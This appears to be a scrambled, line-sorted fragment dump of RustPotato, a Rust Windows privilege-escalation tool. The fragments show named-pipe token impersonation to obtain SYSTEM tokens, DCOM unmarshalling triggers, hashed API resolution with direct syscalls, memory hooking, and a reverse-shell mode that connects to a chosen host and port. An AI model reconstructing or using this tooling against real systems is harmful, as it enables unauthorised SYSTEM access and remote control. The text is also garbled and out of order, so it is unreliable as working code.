 An optional pointer to a context for the APC routine.
 An optional pointer to a time-out value.
 An optional pointer to an APC routine to be called when the operation completes.
 Arguments
 Behavior
 Build Options
 Credits
 Disclaimer
 FILE_APPEND_DATA
 FILE_WRITE_ATTRIBUTES
 FILE_WRITE_ATTRIBUTES 
 FILE_WRITE_DATA
 FILE_WRITE_EA
 Fields
 Flags that specify optional behavior for the operation.
 GENERIC_READ 
 Generated Struct
 HANDLE_FLAG_INHERIT != 0 {
 HANDLE_FLAG_INHERIT) != 0
 HANDLE_FLAG_PROTECT_FROM_CLOSE != 0 {
 HANDLE_FLAG_PROTECT_FROM_CLOSE) != 0
 Help
 It is not intended for manual editing.
 Key Features
 NT API function.
 Notes
 ObjRefType::Standard as u32 != 0 {
 Overview
 PIPE_READMODE_BYTE 
 PIPE_WAIT
 Parameters
 Returns
 RustPotato
 RustPotato supports only x86_64 targets (MSVC or GNU).
 SYNCHRONIZE
 Safety
 Self::ALPHA_BET]
 Self::ALPHA_BET] {
 Specifies the action to take on files that exist or do not exist.
 Specifies the completion mode for the pipe.
 Specifies the options to apply when creating or opening the file.
 Specifies the read mode for the pipe.
 Specifies the type of named pipe (byte stream or message).
 Structure
 TOKEN_ADJUST_DEFAULT
 TOKEN_ADJUST_PRIVILEGES
 TOKEN_ADJUST_SESSIONID
 TOKEN_ASSIGN_PRIMARY
 TOKEN_DUPLICATE
 TOKEN_IMPERSONATE
 The class of information to be queried.
 The desired access for the file handle.
 The desired access for the process.
 The desired access for the token.
 The desired access rights for the duplicated handle.
 The desired access rights for the named pipe file.
 The handle of the process whose token is to be opened.
 The handle of the token to be queried.
 The handle to be duplicated.
 The maximum number of instances of the pipe.
 The new protection attributes for the memory region. This parameter
 The options to be applied when opening the file.
 The requested share access for the file.
 The requested sharing mode of the file.
 The system information class to be queried.
 The type of information to retrieve about the object.
 The type of information to set for the object.
 This file is automatically @generated by Cargo.
 Usage
 [options]
 ]) => {
 account.
 and
 and 
 and gain 
 and resolving function pointers.
 and restores the original state in 
 b as u64
 buffer_size as usize]
 bytes from the memory of the process
 bytes_available > 0 {
 containing the combined standard output and error output of the created process.
 containing the details of all system handles.
 containing the error code if duplication fails.
 containing:
 cur as u32
 extra padding
 for display.
 for host and 
 function within the dispatch table.
 function.
 handle_entry.granted_access == 0x0012019F {
 handle_pid == pid as u32) {
 if a token has been stored.
 if any required attribute extraction fails.
 if any step in the initialization process fails.
 if any step in the unmarshalling process fails.
 if available.
 if initialization succeeds.
 if memory allocation fails.
 if no token is currently set.
 if no valid impersonation level could be ensured or the operations fail.
 if the creation fails.
 if the hook is successfully installed.
 if the logon SID is successfully retrieved.
 if the memory protection update or hook installation fails.
 if the module is not found.
 if the operation fails or the SID cannot be extracted.
 if the operation fails or the type cannot be identified.
 if the operation fails.
 if the process creation or pipe operations fail.
 if the query fails or the elevation type cannot be determined.
 if the query fails or the impersonation level is invalid.
 if the query fails or the integrity level cannot be determined.
 if the reverse shell is successfully established and the process is launched.
 if the token is successfully initialized.
 if the token type is successfully determined.
 index 
 information to determine
 instance from the given handles and process information.
 instance.
 interface.
 io_status_block_read.information > 0 {
 is enabled.
 is not 
 is true).
 is used to store and manage system tokens
 j] == pattern[j] {
 library and its functions.
 library by loading 
 library is initialized before any function pointers are used.
 macro in C.
 method.
 module in memory using the Process Environment Block (PEB).
 module is loaded
 module.
 module_size == 0 {
 object.
 objects.
 on success.
 on the remote server to establish the connection.
 or 
 or an error code on failure.
 or null if the headers are invalid.
 otherwise. The function returns an
 p.is_some() {
 parameter remains unchanged.
 parameter with the function
 parameter.
 plays a key role in persisting the system token retrieved
 pointer to point to the appropriate function based on the number of parameters for 
 pointer.
 pointers.
 port.is_none() {
 privileges on Windows systems.
 process_basic_info.exit_status != 259 {
 process_token.impersonation_level
 process_token.integrity_level > process_token_node.integrity_level))
 representation of the raw pointer.
 representing the address of the syscall.
 representing the effective impersonation level
 representing the elevation type of the token.
 representing the hash value of the syscall.
 representing the impersonation level of the token.
 representing the integrity level of the token.
 representing the syscall number.
 security_binding_bytes.len()) as u16 / 2
 self.dispatch_table.len()
 self.proc_string.is_null()
 self.use_protseq_function_ptr.is_null()
 sid.value.clone())
 size]
 specifying the target PID to filter tokens. If 
 starting at 
 std::mem::size_of::<
 structure
 structure from a byte stream.
 structure in memory
 structure in the module's memory.
 structure into a writer.
 structure into bytes.
 structure that receives the status of the I/O operation.
 structure that specifies the default time-out value.
 structure that specifies the object attributes.
 sub_authority_count)
 text[i 
 that specifies the fully qualified path of the DLL to load. This can be 
 that specifies the name of the DLL to load.
 to assume its security context.
 to be added or checked against the list.
 to continue or 
 to ensure the context is properly initialized.
 to establish a connection with the named pipe.
 to find the 
 to leverage 
 to monitor socket activity
 to retrieve and update handle attributes.
 to share the token across threads.
 to stop further processing.
 to the DCOM unmarshalling process.
 to the appropriate function based on the parameter count
 to unmarshal the object from the COM stream.
 to unmarshal the object from the constructed stream.
 token.impersonation_level.unwrap()
 token.integrity_level.unwrap()
 traits are
 traits for the generated
 winapi::um::errhandlingapi::GetLastError()
 with the correct hash for 
 with the formatted pipe name
 with the handle to the primary token.
 with the specified name and domain.
"                                            ""[-] Failed to open pipe for termination signal: {:"
"                                            _print!(""[-] Failed to duplicate token. Error: {}"", _e)"
"                                        ""["
"                                        Ok(token) => token,"
"                                        token.target_process_pid,"
"                                        token.target_process_token as usize,"
"                                    ""[-] Failed to revert to self. Error: {}"","
"                                    Ok(file) => file,"
"                                    ntdll().nt_terminate_process.run(nt_current_process(), 1)"
"                                ""[-] Failed to impersonate pipe client. Error: {}"","
"                                _print!(""["
"                                _print!(""[-] Error: Invalid port value"")"
"                                if token.sid.clone().unwrap().value == ""S-1-5-18"""
"                            ""[-] Failed to connect named pipe. Error: {}"","
"                            ""[-] NtDuplicateToken for impersonation failed with status: {:"
"                            (io_status_block_read.information - total_sent) as i32,"
"                            // If the pipe cannot be opened, unpark the thread"
"                            0,"
"                            None => return,"
"                            Ok(p) => port = Some(p),"
"                            Some(desc) => desc,"
"                            TOKEN_ELEVATION,"
"                            _print!(""----------------------------------"
"                            _print!(""["
"                            _print!(""[-] Failed to join pipe server thread: {:"
"                            _print!(""{}"", token)"
"                            api_name_addr,"
"                            api_name_len,"
"                            bytes_received as u32 - bytes_written,"
"                            handle_pid,"
"                            list_process_tokens(None, "
"                            network_address: String::from(""127.0.0.1""),"
"                            null_mut(),"
"                            println!(""[-] Failed to start reverse shell"")"
"                            println!(""{}"", e)"
"                            println!(""{}"", out)"
"                            process_handle.unwrap(),"
"                            ptr::null_mut(),"
"                            server_pipe_wide.as_ptr(),"
"                            sock,"
"                            stdin_write,"
"                            token_handle,"
"                            tower_id: crate::def::TowerProtocol::EpmProtocolTcp,"
"                            winapi::um::fileapi::OPEN_EXISTING,"
"                        ""[-] NtDuplicateToken for delegation failed with status: {:"
"                        // If both attempts fail, return None."
"                        // If successful, set the level to Impersonation and close the duplicated token handle."
"                        0,          // Input buffer size"
"                        0,"
"                        0x00000000, // PIPE_TYPE_BYTE "
"                        0x00000003, // PIPE_ACCESS_DUPLEX"
"                        123,        // Default timeout"
"                        255,        // PIPE_UNLIMITED_INSTANCES"
"                        521,        // Output buffer size"
"                        Specify the shell to be used in the reverse shell (optional, default is cmd)."
"                        TOKEN_ELEVATION,"
"                        TokenType::Impersonation as u32,"
"                        _print!(""["
"                        _print!(""[-] Error: Missing value for -c"")"
"                        _print!(""[-] Error: Missing value for -h"")"
"                        _print!(""[-] Error: Missing value for -p"")"
"                        _print!(""[-] Failed to create named pipe."")"
"                        attributes: 0,"
"                        bInheritHandle: 0,"
"                        context_tracking_mode: 1, // SECURITY_DYNAMIC_TRACKING."
"                        effective_only: 0,        // FALSE: Allows full delegation."
"                        impersonation_level: SecurityImpersonationLevel::Impersonation as u32,"
"                        length: core::mem::size_of::<ObjectAttributes>() as u32,"
"                        length: core::mem::size_of::<SecurityQualityOfService>() as u32,"
"                        lpSecurityDescriptor: ptr::null_mut(),"
"                        nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,"
"                        num_entries: 0,"
"                        object_name: null_mut(),"
"                        root_directory: null_mut(),"
"                        security_binding: SecurityBinding::new(0xa, 0xffff, None),"
"                        security_descriptor: null_mut(),"
"                        security_offset: 0,"
"                        server_pipe_wide.as_ptr(),"
"                        token_handle,"
"                        true => Some(()), // Reverse shell started successfully"
"                        unsafe { ntdll().nt_terminate_process.run(nt_current_process(), 1) }"
"                        },"
"                     Specify the shell to be used in the reverse shell (optional, default is cmd)."
"                    ""[!] Restoration failed: hook is inactive or original function pointer is null"""
"                    ""["
"                    ""[-] Memory protection update failed. Error: 0x{:08X}"","
"                    ""[-] Memory protection update failed. Error: {}"","
"                    ""[-] NtQuerySystemInformation failed with status: 0x{:08X}"","
"                    ""[-] Unsupported UseProtseqFunctionParamCount: {}"","
"                    (entrie_size - 2) as i16,"
"                    (winsock().recv)(sock, buffer.as_mut_ptr() as "
"                    .collect::<Vec<u8>>(),"
"                    // If Delegation fails, attempt to duplicate the token with Impersonation level."
"                    // If only a command is provided, execute it using the token"
"                    // If successful, set the level to Delegation and close the duplicated token handle."
"                    // Increment SSN if the function starts with ""Zw"" (system call)."
"                    0,"
"                    TOKEN_ELEVATION,"
"                    TokenType::Impersonation as u32,"
"                    _print!(""["
"                    _print!(""[-] Error: Unknown option {}"", args[i])"
"                    _print!(""[-] Failed to decode the Base64 object reference"")"
"                    _print!(""[-] Failed to initialize unmarshalling trigger"")"
"                    _print!(""[-] Failed to obtain the display name of the moniker."")"
"                    _print!(""[-] Pipe server is not running."")"
"                    _print!(""{}"", token)"
"                    address: core::ptr::null_mut(),"
"                    attributes: 0,"
"                    buffer.len() as u32,"
"                    context_tracking_mode: 1, // SECURITY_DYNAMIC_TRACKING."
"                    dup_handle,"
"                    effective_only: 0,        // FALSE: Allows full delegation."
"                    flags: 0,"
"                    handle_pid as i32,"
"                    handle_pid,"
"                    hash: $hash,"
"                    if api_name_str.starts_with(""Zw"") {"
"                    impersonation_level: SecurityImpersonationLevel::Delegation as u32,"
"                    ipid: tmp_obj_ref.standard_objref.ipid,"
"                    length: core::mem::size_of::<ObjectAttributes>() as u32,"
"                    length: core::mem::size_of::<SecurityQualityOfService>() as u32,"
"                    let (security_descriptor, _security_descriptor_size) ="
"                    let connected = ConnectNamedPipe(pipe_handle, ptr::null_mut()) != 0"
"                    let result = rs(h.unwrap(), p.unwrap(), c, raw_token_handle.as_handle())"
"                    let security_descriptor_string = ""D:(A"
"                    match create_process_with_token_w_piped(raw_token_handle.as_handle(), c) {"
"                    null_mut(),"
"                    number: 0,"
"                    object_name: null_mut(),"
"                    oid: tmp_obj_ref.standard_objref.oid,"
"                    oxid: tmp_obj_ref.standard_objref.oxid,"
"                    process_handle.unwrap(),"
"                    public_refs: 1,"
"                    root_directory: null_mut(),"
"                    security_descriptor: null_mut(),"
"                    stdout_read,"
"                    token_handle,"
"                    unsafe { ntdll().nt_terminate_process.run(nt_current_process(), 0) }"
"                    unsafe { ntdll().nt_terminate_process.run(nt_current_process(), 1) }"
"                    value: String::from(""00000000-0000-0000-C000-000000000046""),"
"                    },"
"                """
"                ""--help"" => {"
"                ""-c"" => {"
"                ""-h"" => {"
"                ""-p"" => {"
"                ""["
"                ""[-] Failed to create security descriptor with error: {:"
"                (winsock.closesocket, 0x185953a4, CloseSocketFunc),"
"                (winsock.connect, 0xe73478ef, ConnectFunc),"
"                (winsock.freeaddrinfo, 0x307204e, FreeAddrInfoFunc),"
"                (winsock.getaddrinfo, 0x4b91706c, GetAddrInfoFunc),"
"                (winsock.htons, 0xd454eb1, HtonsFunc),"
"                (winsock.inet_addr, 0xafe73c2f, InetAddrFunc),"
"                (winsock.ioctlsocket, 0xd5e978a9, IoctlsocketFunc),"
"                (winsock.recv, 0x7c8b3515, RecvFunc),"
"                (winsock.select, 0xce86a705, SelectFunc),"
"                (winsock.send, 0x7c8bc2cf, SendFunc),"
"                (winsock.socket, 0xcf36c66e, SocketFunc),"
"                (winsock.wsa_cleanup, 0x32206eb8, WSACleanupFunc),"
"                (winsock.wsa_get_last_error, 0x9c1d912e, WSAGetLastErrorFunc)"
"                (winsock.wsa_startup, 0x142e89c3, WSAStartupFunc),"
"                .collect::<Vec<u8>>(),"
"                .replace("":"", """")"
"                .replace(""objref:"", """")"
"                // Close the previously opened process handle, if any"
"                // If another error occurred, free memory and exit"
"                // If both host and port are provided, start a reverse shell"
"                // If the process handle is valid, retrieve and process its primary token"
"                // The SID pointer is null, indicating an issue."
"                0, // ProcessBasicInformation"
"                0,"
"                0x00001000 => IntegrityLevel::LowIntegrity,"
"                0x00002000 => IntegrityLevel::MediumIntegrity,"
"                0x00002100 => IntegrityLevel::MediumHighIntegrity,"
"                0x00003000 => IntegrityLevel::HighIntegrity,"
"                0x00004000 => IntegrityLevel::SystemIntegrity,"
"                0x00005000 => IntegrityLevel::ProtectedProcess,"
"                0xd5312e5d,"
"                0xf3e5480c,"
"                64, // SystemExtendedHandleInformation"
"                8,"
"                CreateStreamOnHGlobal(windows::Win32::Foundation::HGLOBAL(ptr as _), true).ok()"
"                Ok(bytes) => i32::from_ne_bytes(bytes),"
"                PAGE_EXECUTE_READWRITE,"
"                Some(display_name) => display_name.to_string(),"
"                String::from(""ncacn_ip_tcp:safe !""), // Static TCP endpoint"
"                TOKEN_ELEVATION,"
"                TokenType::Primary as u32,"
"                _ => IntegrityLevel::Untrusted, // Default for unknown RIDs."
"                _print!(""["
"                _print!(""[-] Could not parse the ObjRef from the provided byte stream."")"
"                _print!(""[-] Failed to allocate memory for handle information"")"
"                _print!(""[-] Failed to allocate memory from the process heap."")"
"                _print!(""[-] Failed to convert the moniker's display name into a string."")"
"                _print!(""[-] Failed to locate RPC_SERVER_INTERFACE structure."")"
"                _print!(""[-] Failed to locate combase.dll module."")"
"                _print!(""[-] Failed to obtain the process heap."")"
"                _print!(""[-] Failed to read DLL content from memory."")"
"                _print!(""[-] NtDuplicateToken failed with status: {:"
"                _print!(""[-] ObjRef serialization failed."")"
"                _print!(""[-] System token not found"")"
"                _print!(""[-] The object reference could not be decoded from Base64."")"
"                _print!(""[-] Unknown token ELEVATION TYPE : {}"", elevation_type)"
"                advapi32.create_process_with_token_w,"
"                attributes: 0,"
"                buffer_size,"
"                context_tracking_mode: 1, // SECURITY_DYNAMIC_TRACKING."
"                core::mem::size_of::<ProcessBasicInformation>() as u32,"
"                core::ptr::null(),                   // Local system"
"                dealloc(handle_info_ptr, layout)"
"                domain.as_mut_ptr(),                 // Buffer for the domain"
"                effective_only: 0,        // FALSE: Allows full delegation."
"                fd_array,"
"                fd_count: 1,"
"                for (i, "
"                global_context.client_pipe.clone(),  // Client-specific pipe"
"                guid,"
"                handle.unique_process_id, handle.handle_value, handle.granted_access"
"                handle_info_size as u32,"
"                if let Some(handle_entry) = handle_at(handle_info_ptr, i) {"
"                impersonation_level: SecurityImpersonationLevel::Impersonation as u32,"
"                k32.peek_named_pipe,"
"                length: core::mem::size_of::<ObjectAttributes>() as u32,"
"                length: core::mem::size_of::<SecurityQualityOfService>() as u32,"
"                local_process_handle,"
"                module_base as usize,"
"                name.as_mut_ptr(),                   // Buffer for the name"
"                null_mut(),"
"                object_name: null_mut(),"
"                process_handle.unwrap(),"
"                process_info.h_process,"
"                ptr = rtl_allocate_heap(process_heap, HEAP_ZERO_MEMORY, stream.len())"
"                ptr::write(ppdsa_new_bindings, pdsa_new_bindings as "
"                root_directory: null_mut(),"
"                security_descriptor: null_mut(),"
"                self.to_ptr(),                       // SID to lookup"
"                self.token_handle,"
"                standard_objref,"
"                stdout_read,"
"                sub_auth_bytes[0],"
"                sub_auth_bytes[1],"
"                sub_auth_bytes[2],"
"                sub_auth_bytes[3],"
"                token_handle,"
"                token_information_class,"
"                tv_sec: 0,"
"                tv_usec: 10000,"
"                ws2_win32_dll_unicode,"
"                },"
"            !handles.is_empty(),"
"            ""   Impersonation Level: {}"","
"            ""   Integrity Level: {}"","
"            ""   SID: {}"","
"            ""   Target Process Handle: 0x{:X}"","
"            ""   Target Process Token Handle: 0x{:X}"","
"            ""   Token Elevation Type: {}"","
"            ""   Token Type: {}"","
"            ""   Token Username: {}"","
"            ""127.0.0.1"""
"            ""NtClose"","
"            ""NtCreateNamedPipeFile"","
"            ""NtDuplicateObject"","
"            ""NtDuplicateToken"","
"            ""NtOpenFile"","
"            ""NtOpenProcess"","
"            ""NtOpenProcessToken"","
"            ""NtProtectVirtualMemory"","
"            ""NtQueryInformationProcess"","
"            ""NtQueryInformationToken"","
"            ""NtQueryObject"","
"            ""NtQuerySystemInformation"","
"            ""NtReadFile"","
"            ""NtSetInformationObject"","
"            ""NtTerminateProcess"","
"            ""NtWaitForSingleObject"","
"            ""NtWriteFile"","
"            ""The list of system handles should not be empty"""
"            ""Usage: {} <cmdline> OR -h <host> -p <port> [-c <cmd>]"","
"            ""mov {}, gs:[0x30]"","
"            ""{:08x}-{:04x}-{:04x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}"","
"            ""{:<30} {:<10} {:<20}"","
"            $syscall.number = $crate::win32::ssn::get_ssn($syscall.hash(), "
"            .run(pi.h_process, false, null_mut())"
"            // Duplicate the token, converting it to a primary token."
"            // If a full match is found, record the index"
"            // If lookup fails, return an error"
"            // If memory allocation fails, return an error."
"            // If the buffer size is zero, return early as no data can be retrieved."
"            // If the handle is successfully duplicated, create and process a token"
"            // If the impersonation level is not set, attempt to upgrade the token."
"            // If the query fails, return None."
"            // If the token is already a primary token, return its handle directly."
"            // Perform the syscall with the given number, address (offset by 0x12),"
"            // Remove ""objref:"" and decode the Base64 string"
"            // _print!(""[-] RTF RVA is 0, returning -1..."")"
"            // argument count, and the arguments"
"            0 => Some(SecurityImpersonationLevel::Anonymous),"
"            0, // Use the default buffer size of 4096 bytes."
"            0,"
"            0x04 => Ok(TowerProtocol::EpmProtocolDnetNsp),"
"            0x05 => Ok(TowerProtocol::EpmProtocolOsiTp4),"
"            0x06 => Ok(TowerProtocol::EpmProtocolOsiClns),"
"            0x07 => Ok(TowerProtocol::EpmProtocolTcp),"
"            0x08 => Ok(TowerProtocol::EpmProtocolUdp),"
"            0x09 => Ok(TowerProtocol::EpmProtocolIp),"
"            0x0a => Ok(TowerProtocol::EpmProtocolNcadg),"
"            0x0b => Ok(TowerProtocol::EpmProtocolNcacn),"
"            0x0c => Ok(TowerProtocol::EpmProtocolNcalrpc),"
"            0x0d => Ok(TowerProtocol::EpmProtocolUuid),"
"            0x0e => Ok(TowerProtocol::EpmProtocolIpx),"
"            0x0f => Ok(TowerProtocol::EpmProtocolSmb),"
"            0x10 => Ok(TowerProtocol::EpmProtocolNamedPipe),"
"            0x11 => Ok(TowerProtocol::EpmProtocolNetbios),"
"            0x12 => Ok(TowerProtocol::EpmProtocolNetbeui),"
"            0x13 => Ok(TowerProtocol::EpmProtocolSpx),"
"            0x14 => Ok(TowerProtocol::EpmProtocolNbIpx),"
"            0x16 => Ok(TowerProtocol::EpmProtocolDsp),"
"            0x17 => Ok(TowerProtocol::EpmProtocolDdp),"
"            0x18 => Ok(TowerProtocol::EpmProtocolAppletalk),"
"            0x1a => Ok(TowerProtocol::EpmProtocolVinesSpp),"
"            0x1b => Ok(TowerProtocol::EpmProtocolVinesIpc),"
"            0x1c => Ok(TowerProtocol::EpmProtocolStreettalk),"
"            0x1f => Ok(TowerProtocol::EpmProtocolHttp),"
"            0x20 => Ok(TowerProtocol::EpmProtocolUnixDs),"
"            0x21 => Ok(TowerProtocol::EpmProtocolNull),"
"            1 => Some(SecurityImpersonationLevel::Identification),"
"            1 => Some(TokenElevationType::Default), // Default token type."
"            1 => Some(TokenType::Impersonation),"
"            1, // Revision"
"            1,"
"            2 => Some(SecurityImpersonationLevel::Impersonation),"
"            2 => Some(TokenElevationType::Full),    // Full elevated token."
"            2 => Some(TokenType::Primary),"
"            2,"
"            3 => Some(SecurityImpersonationLevel::Delegation),"
"            3 => Some(TokenElevationType::Limited), // Limited token with restricted privileges."
"            ErrorKind::Other,"
"            INIT_ADVAPI32.store(true, Ordering::Release)"
"            INIT_K32.store(true, Ordering::Release)"
"            INIT_WS32.store(true, Ordering::Release)"
"            Ok(bytes) => i32::from_ne_bytes(bytes),"
"            Ok(bytes) => u32::from_ne_bytes(bytes),"
"            ProcessToken::get_token_info_size(token_handle, token_information_class)"
"            Some((security_descriptor, security_descriptor_size))"
"            Some(host.unwrap().as_str()),"
"            _ => Err(""Invalid TowerProtocol value""),"
"            _ => None, // Return None for any unknown token type."
"            _ => None, // Return None for unknown or unsupported levels."
"            _print!("""
"            _print!(""----------------------------------"
"            _print!(""[!] Cannot start: Hook is inactive or server already running"")"
"            _print!(""[!] Global context is already set"")"
"            _print!(""["
"            _print!(""[-] Error: Both -h and -p are required."")"
"            _print!(""[-] Error: The argument cannot be an empty string."")"
"            _print!(""[-] Failed to find IDL structure"")"
"            _print!(""[-] Failed to initialize COM library: {:"
"            _print!(""[-] Invalid OBJREF signature"")"
"            _print!(""[-] System token not found"")"
"            _print!(""[-] Unsupported OBJREF type"")"
"            _print!(""[-] combase.dll module not found"")"
"            advapi32.module_base = ldr_module(0x64bb3129, None)"
"            alertable as u32,"
"            apc_context,"
"            apc_routine,"
"            attributes: 0,"
"            authn_svc,"
"            authz_svc,"
"            base_address,"
"            bind_ctx,"
"            buffer,"
"            buffer.len() as u32,"
"            buffer: ptr::null_mut(),"
"            byte_offset,"
"            cb: core::mem::size_of::<StartupInfoW>() as u32,"
"            cb_reserved2: 0,"
"            child_stdout_read,"
"            client_pipe: String::from(""ncacn_np:localhost/pipe/RustPotato["
"            closesocket: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },"
"            cmdline_utf16.as_mut_ptr(),"
"            combase_module: ptr::null_mut(),"
"            completion_mode,"
"            connect: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },"
"            core::ptr::null(),"
"            core::str::from_utf8_unchecked(core::slice::from_raw_parts(dll_name, dll_name_len))"
"            create_disposition,"
"            create_options,"
"            create_process_with_token_w: unsafe { core::mem::transmute(null_mut::<c_void>()) },"
"            dealloc(handle_info_ptr, layout)"
"            desired_access,      // Specify the access rights desired for the process handle."
"            desired_access,"
"            dispatch_table: Vec::new(),"
"            dispatch_table_ptr: ptr::null_mut(),"
"            dual_string_array,"
"            dw_fill_attribute: 0,"
"            dw_flags: 0,"
"            dw_process_id: 0,"
"            dw_thread_id: 0,"
"            dw_x: 0,"
"            dw_x_count_chars: 0,"
"            dw_x_size: 0,"
"            dw_y: 0,"
"            dw_y_count_chars: 0,"
"            dw_y_size: 0,"
"            effective_level as c_uint,"
"            event,"
"            existing_token_handle,"
"            f,"
"            file_handle,"
"            flags,"
"            fmt_string_offset_table: Vec::new(),"
"            format!(""CreateProcessWithTokenW failed: {}"", Error::last_os_error()),"
"            format!(""NtCreateNamedPipeFile failed: {:"
"            format!(""NtQueryObject failed: {:"
"            format!(""NtSetInformationObject failed: {:"
"            format!(""{:"
"            freeaddrinfo: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },"
"            getaddrinfo: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },"
"            guid,"
"            h_process: ptr::null_mut(),"
"            h_std_error: ptr::null_mut(),"
"            h_std_input: ptr::null_mut(),"
"            h_std_output: ptr::null_mut(),"
"            h_thread: ptr::null_mut(),"
"            handle,"
"            handle_attributes,"
"            high_part: 0,"
"            htoken,"
"            htons: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },"
"            impersonation_level: Some(impersonation_level),"
"            inbound_quota,"
"            inet_addr: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },"
"            information: 0,"
"            integrity_level: Some(integrity_level),"
"            io_status_block,"
"            ioctlsocket: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },"
"            ipid,"
"            is_hook: false,"
"            is_restricted,"
"            is_start: false,"
"            k32.module_base = ldr_module(0x6ddb9555, None)"
"            ldr_load_dll: unsafe { core::mem::transmute(null_mut::<c_void>()) },"
"            length,"
"            length: 0,"
"            let apicall_addr = $crate::win32::ldr::ldr_function($module_base, $hash)"
"            let buffer = ProcessToken::get_token_info(token_handle, 25)"
"            let dll_content = read_memory(process, module_base as "
"            let dll_name = ""ws2_32.dll"""
"            let interface: Result<IUnknown, windows_core::Error> ="
"            let layout = Layout::from_size_align(handle_info_size, std::mem::align_of::<u8>())"
"            let module_base = ldr_module(0x56777929, Some("
"            let rid_ptr = GetSidSubAuthority(sid_ptr, (sub_auth_count - 1) as u32)"
"            low_part: 0,"
"            lp_desktop: ptr::null_mut(),"
"            lp_reserved2: ptr::null_mut(),"
"            lp_reserved: ptr::null_mut(),"
"            lp_title: ptr::null_mut(),"
"            maximum_instances,"
"            maximum_length: 0,"
"            module_base: null_mut(),"
"            moniker,"
"            named_pipe_type,"
"            network_address,"
"            new_protect,"
"            nt_close: NtClose::new(),"
"            nt_create_named_pipe_file: NtCreateNamedPipeFile::new(),"
"            nt_duplicate_object: NtDuplicateObject::new(),"
"            nt_duplicate_token: NtDuplicateToken::new(),"
"            nt_open_file: NtOpenFile::new(),"
"            nt_open_process: NtOpenProcess::new(),"
"            nt_open_process_token: NtOpenProcessToken::new(),"
"            nt_protect_virtual_memory: NtProtectVirtualMemory::new(),"
"            nt_query_information_process: NtQueryInformationProcess::new(),"
"            nt_query_information_token: NtQueryInformationToken::new(),"
"            nt_query_object: NtQueryObject::new(),"
"            nt_query_system_information: NtQuerySystemInformation::new(),"
"            nt_read_file: NtReadFile::new(),"
"            nt_set_information_object: NtSetInformationObject::new(),"
"            nt_terminate_process: NtTerminateProcess::new(),"
"            nt_wait_for_single_object: NtWaitForSingleObject::new(),"
"            nt_write_file: NtWriteFile::new(),"
"            ntdll.module_base,"
"            ntdll.nt_close,"
"            ntdll.nt_close.number(),"
"            ntdll.nt_create_named_pipe_file,"
"            ntdll.nt_create_named_pipe_file.number(),"
"            ntdll.nt_duplicate_object,"
"            ntdll.nt_duplicate_object.number(),"
"            ntdll.nt_duplicate_token,"
"            ntdll.nt_duplicate_token.number(),"
"            ntdll.nt_open_file,"
"            ntdll.nt_open_file.number(),"
"            ntdll.nt_open_process,"
"            ntdll.nt_open_process.number(),"
"            ntdll.nt_open_process_token,"
"            ntdll.nt_open_process_token.number(),"
"            ntdll.nt_protect_virtual_memory.number(),"
"            ntdll.nt_query_information_process,"
"            ntdll.nt_query_information_process.number(),"
"            ntdll.nt_query_information_token,"
"            ntdll.nt_query_information_token.number(),"
"            ntdll.nt_query_object,"
"            ntdll.nt_query_object.number(),"
"            ntdll.nt_query_system_information,"
"            ntdll.nt_query_system_information.number(),"
"            ntdll.nt_read_file,"
"            ntdll.nt_read_file.number(),"
"            ntdll.nt_set_information_object,"
"            ntdll.nt_set_information_object.number(),"
"            ntdll.nt_terminate_process,"
"            ntdll.nt_terminate_process.number(),"
"            ntdll.nt_wait_for_single_object,"
"            ntdll.nt_wait_for_single_object.number(),"
"            ntdll.nt_write_file,"
"            ntdll.nt_write_file.number(),"
"            null(),"
"            null_mut(),"
"            num_entries,"
"            object_attributes,"
"            object_information,"
"            object_information_class,"
"            object_information_length,"
"            object_name: ptr::null_mut(),"
"            oid,"
"            orcb_rpc_guid: GUID::new(""18f70770-8e64-11cf-9af1-0020af6e72f4"".to_string()),"
"            outbound_quota,"
"            oxid,"
"            p_iunknown,"
"            part1,"
"            part2,"
"            part3,"
"            part4[0],"
"            part4[1],"
"            part5[0],"
"            part5[1],"
"            part5[2],"
"            part5[3],"
"            part5[4],"
"            peek_named_pipe: unsafe { core::mem::transmute(null_mut::<c_void>()) },"
"            pipe_server_thread: Arc::new(Mutex::new(None)),"
"            port,"
"            principal_name,"
"            println!(""{}"", token)"
"            proc_string: ptr::null_mut(),"
"            process,"
"            process_handle,"
"            process_information,"
"            process_information_class,"
"            process_information_length,"
"            pub hash: usize,"
"            pub number: u16,"
"            public_refs,"
"            read_mode,"
"            recv: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },"
"            region_size,"
"            resolve_functions!(advapi32.module_base, [("
"            resolve_functions!(k32.module_base, [("
"            resolve_functions!(ws2_32_module, ["
"            return Err(""GUID length is incorrect, must be 16 bytes"".into())"
"            return Err(""Invalid GUID format"".into())"
"            root_directory: ptr::null_mut(),"
"            rtl_allocate_heap: None,"
"            security_binding,"
"            security_descriptor: ptr::null_mut(),"
"            security_offset,"
"            security_quality_of_service: ptr::null_mut(),"
"            select: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },"
"            self.address as usize,"
"            self.number,"
"            send: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },"
"            server_pipe: String::from("""
"            share_access,"
"            sid: Some(logon_sid),"
"            size,"
"            socket: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },"
"            source_handle,"
"            source_process_handle,"
"            standard_objref,"
"            std::io::ErrorKind::Other,"
"            std::ptr::copy_nonoverlapping(stream.as_ptr(), ptr as "
"            string_binding,"
"            system_identity: Some(Arc::new(Mutex::new(WindowsIdentity::default()))),"
"            system_information,"
"            system_information_class,"
"            system_information_length,"
"            target_handle,"
"            target_process_handle,"
"            target_process_pid,"
"            target_process_token,"
"            token,"
"            token_elevation_type: Some(token_elevation_type),"
"            token_handle,"
"            token_information,"
"            token_information_class,"
"            token_information_length,"
"            token_type,"
"            token_type: Some(token_type),"
"            u: IO_STATUS_BLOCK_u { status: 0 },"
"            unique_process: ptr::null_mut(),"
"            unique_thread: ptr::null_mut(),"
"            unmashal_trigger: None,"
